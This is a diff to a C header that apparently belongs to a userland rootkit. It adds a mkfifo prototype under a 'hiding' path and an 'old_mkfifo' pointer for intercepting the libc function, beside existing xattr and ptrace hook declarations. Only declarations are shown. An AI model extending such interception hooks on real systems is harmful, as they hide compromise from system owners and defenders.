@@ -77,6 +77,9 @@ int removexattr(const char *path, const char *name);
 int lremovexattr(const char *path, const char *name);
 int fremovexattr(int fd, const char *name);
 
+// symbols/hiding/mkfifo.c
+int mkfifo(const char *pathname, mode_t mode);
+
 // symbols/hiding/debug/*
 long ptrace(void *request, pid_t pid, void *addr, void *data);
 
@@ -242,6 +245,8 @@ typeof(flistxattr) *old_flistxattr;
 typeof(removexattr) *old_removexattr;
 typeof(lremovexattr) *old_lremovexattr;
 typeof(fremovexattr) *old_fremovexattr;
+
+typeof(mkfifo) *old_mkfifo;
 
 typeof(ptrace) *old_ptrace;
 
